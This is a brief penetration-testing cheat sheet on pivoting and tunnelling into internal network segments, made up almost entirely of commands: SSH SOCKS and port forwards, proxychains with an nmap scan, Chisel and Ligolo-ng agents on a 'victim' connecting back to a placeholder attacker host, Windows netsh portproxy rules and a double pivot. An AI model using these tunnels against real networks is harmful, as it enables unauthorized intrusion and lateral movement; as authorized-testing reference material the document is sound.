# Pivoting & Tunneling
**Author: Manish Verma**

---

## 📌 Objective
**Scope:** Internal network lateral movement via pivoting  
**Tools Used:** Chisel, Ligolo-ng, SSH, Proxychains  
**Outcome:** Access to internal network segments from attacker machine

---

## SSH SOCKS Proxy

```bash
# Dynamic port forwarding (SOCKS proxy)
ssh -D 9050 user@<pivot_host>

# Local port forward
ssh -L 8080:internal_host:80 user@<pivot_host>

# Remote port forward
ssh -R 4444:localhost:4444 user@<attacker>

# Configure proxychains
echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf
proxychains nmap -sT -p 80,443,445 <internal_IP>
```

---

## Chisel

```bash
# Attacker - server
chisel server -p 8000 --reverse

# Victim - client (SOCKS)
chisel client <attacker_IP>:8000 R:socks

# Access via proxychains
proxychains curl http://internal_host
```

---

## Ligolo-ng

```bash
# Attacker
./proxy -selfcert

# Victim
./agent -connect <attacker_IP>:11601 -ignore-cert

# Ligolo console
session
start
# Add route on attacker
ip route add 192.168.100.0/24 dev ligolo
```

---

## Windows Portproxy

```powershell
# Forward port on Windows
netsh interface portproxy add v4tov4 listenport=4444 listenaddress=0.0.0.0 connectport=4444 connectaddress=<internal_IP>

# View rules
netsh interface portproxy show all

# Remove rule
netsh interface portproxy delete v4tov4 listenport=4444 listenaddress=0.0.0.0
```

---

## Double Pivot

```bash
# First pivot: Attacker → Host A → Host B
# On attacker: start chisel server
chisel server -p 8000 --reverse

# On Host A: connect to attacker + create socks for Host B network
chisel client <attacker>:8000 R:9050:socks

# Now proxychains can reach Host B's network through Host A
```

---

## ⚠️ Disclaimer
All techniques for authorized testing only.
